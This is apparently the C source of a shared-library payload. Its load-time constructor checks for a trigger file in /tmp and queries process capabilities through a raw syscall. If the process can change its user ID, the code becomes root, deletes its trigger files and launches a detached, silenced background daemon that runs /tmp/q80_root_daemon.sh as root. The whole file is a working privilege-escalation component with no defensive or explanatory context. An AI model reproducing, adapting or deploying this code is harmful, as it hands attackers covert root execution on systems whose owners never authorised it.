typedef unsigned int u32;

extern int close(int fd);
extern int dup2(int oldfd, int newfd);
extern int execve(const char *path, char *const argv[], char *const envp[]);
extern int fork(void);
extern int open(const char *path, int flags, ...);
extern int pipe(int fds[2]);
extern long read(int fd, void *buffer, unsigned long count);
extern int setgid(unsigned int gid);
extern int setsid(void);
extern int setuid(unsigned int uid);
extern long syscall(long number, ...);
extern int unlink(const char *path);
extern long write(int fd, const void *buffer, unsigned long count);
extern void _exit(int status);

struct capability_header {
    u32 version;
    int pid;
};

struct capability_data {
    u32 effective;
    u32 permitted;
    u32 inheritable;
};

static void spawn_daemon(void)
{
    char *const argv[] = {
        "/bin/busybox", "sh", "/tmp/q80_root_daemon.sh", 0,
    };
    int sync[2];
    int child;
    char ready;

    if (pipe(sync) != 0)
        return;
    child = fork();
    if (child == 0) {
        close(sync[0]);
        if (setsid() < 0)
            _exit(1);
        write(sync[1], "1", 1);
        close(sync[1]);
        for (int fd = 0; fd < 64; ++fd)
            close(fd);
        int null_fd = open("/dev/null", 2);
        if (null_fd >= 0) {
            dup2(null_fd, 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            if (null_fd > 2)
                close(null_fd);
        }
        execve(argv[0], argv, 0);
        _exit(1);
    }
    close(sync[1]);
    if (child > 0)
        read(sync[0], &ready, 1);
    close(sync[0]);
}

__attribute__((constructor))
static void on_load(void)
{
    static const char spawn_path[] = "/tmp/q80_root_spawn";
    struct capability_header header = {0x20080522, 0};
    struct capability_data capabilities[2] = {{0, 0, 0}, {0, 0, 0}};
    int fd = open(spawn_path, 0);

    if (fd < 0)
        return;
    close(fd);
    if (syscall(184, &header, capabilities) != 0)
        return;
    if ((capabilities[0].permitted & 0x80U) == 0)
        return;
    if (setgid(0) != 0 || setuid(0) != 0)
        return;
    unlink(spawn_path);
    unlink("/tmp/q80_root_ready");
    unlink("/tmp/q80_root_go");
    spawn_daemon();
}
